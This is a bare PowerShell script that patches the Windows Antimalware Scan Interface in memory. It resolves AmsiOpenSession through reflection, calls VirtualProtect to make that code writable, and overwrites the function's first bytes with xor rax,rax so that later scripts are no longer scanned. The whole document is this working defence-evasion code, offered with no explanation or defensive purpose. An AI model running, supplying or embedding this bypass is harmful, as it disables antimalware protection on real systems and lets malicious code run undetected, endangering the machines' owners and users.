function LookupFunc {
    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
        Where-Object { 
            $_.GlobalAssemblyCache -and 
            $_.Location.Split('\')[-1] -eq 'System.dll'
        }
    ).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $getModHandle = $assem.GetMethod(
        'GetModuleHandle',
        [System.Reflection.BindingFlags] 'Public, Static, NonPublic',
        $null,
        [System.Type[]] @([String]),
        $null
    )

    $hModule = $getModHandle.Invoke($null, @($moduleName))

    $getProcAddr = $assem.GetMethod(
        'GetProcAddress',
        [System.Reflection.BindingFlags] 'Public, Static, NonPublic',
        $null,
        [System.Type[]] @([IntPtr],[String]),
        $null
    )

    return $getProcAddr.Invoke($null, @($hModule, $functionName))
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.
        DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
                             [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
        DefineDynamicModule('InMemoryModule', $false).
        DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
                   [System.MulticastDelegate])

    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public', 
        [System.Reflection.CallingConventions]::Standard, 
        $func
    ).SetImplementationFlags('Runtime, Managed')

    $type.DefineMethod(
        'Invoke', 
        'Public, HideBySig, NewSlot, Virtual', 
        $delType, 
        $func
    ).SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
$buf = [Byte[]] (0x48, 0x31, 0xC0) 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
